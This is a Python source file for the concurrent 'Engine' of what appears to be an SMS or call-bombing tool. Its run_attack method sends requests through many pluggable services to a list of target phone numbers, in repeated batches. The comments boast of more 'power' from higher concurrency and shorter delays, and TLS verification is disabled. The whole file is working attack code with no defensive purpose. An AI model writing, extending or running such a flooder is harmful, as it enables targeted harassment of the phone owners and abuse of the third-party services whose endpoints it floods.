import asyncio
import aiohttp
from typing import List, Dict, Any, Optional, Callable
from core.base_service import BaseService
from utils.logger import logger
from utils.config import config

class Engine:
    def __init__(self, services: List[BaseService]):
        self.services = services
        self._session: Optional[aiohttp.ClientSession] = None
        self._semaphore = asyncio.Semaphore(30) # Increased for "more powerful" engine

    async def get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=20), # Shorter timeout
                connector=aiohttp.TCPConnector(
                    limit=25, # Reduced for low RAM
                    ttl_dns_cache=300,
                    use_dns_cache=True,
                    ssl=False
                )
            )
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    async def run_attack(
        self, 
        phones: List[str], 
        batches: int, 
        selected_service_names: Optional[List[str]] = None,
        on_progress: Optional[Callable[[int, int, int, int], Any]] = None
    ) -> Dict[str, int]:
        session = await self.get_session()
        
        target_services = self.services
        if selected_service_names:
            target_services = [s for s in self.services if s.name in selected_service_names]

        if not target_services:
            logger.error("No services selected for attack")
            return {"success": 0, "failed": 0}

        total_success = 0
        total_failed = 0

        for i in range(1, batches + 1):
            logger.info(f"Starting batch {i}/{batches} for {len(phones)} targets")
            
            tasks = []
            for phone in phones:
                for service in target_services:
                    tasks.append(self._guarded_send(service, session, phone))
            
            results = await asyncio.gather(*tasks)
            
            batch_success = sum(1 for r in results if r)
            batch_failed = len(results) - batch_success
            
            total_success += batch_success
            total_failed += batch_failed
            
            if on_progress:
                if asyncio.iscoroutinefunction(on_progress):
                    await on_progress(i, batches, batch_success, batch_failed)
                else:
                    on_progress(i, batches, batch_success, batch_failed)
            
            if i < batches:
                # Reduced delay for more power
                delay = 1 
                logger.debug(f"Waiting {delay}s before next batch")
                await asyncio.sleep(delay)

        return {"success": total_success, "failed": total_failed}

    async def _guarded_send(self, service: BaseService, session: aiohttp.ClientSession, phone: str) -> bool:
        async with self._semaphore:
            return await service.send(session, phone)
